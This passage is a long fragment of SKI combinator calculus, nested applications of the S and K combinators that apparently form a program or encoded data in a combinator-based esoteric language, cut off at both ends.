S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S))